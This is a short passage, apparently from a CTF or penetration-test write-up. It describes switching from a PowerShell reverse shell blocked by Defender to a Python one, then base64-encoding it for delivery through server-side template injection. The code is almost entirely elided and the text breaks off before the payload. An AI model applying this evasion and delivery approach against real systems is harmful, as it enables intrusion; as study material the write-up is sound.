...
We first attempted to use PowerShell for reverse shell, but these attempts were caught by Defender AntiVirus. However, switching to Python is simpler. The following payload is used for reverse shell
```
...
try:
    ...
    s.close()
```
To execute this payload via SSTI, the script was base64-encoded and embedded into the following payload:
```
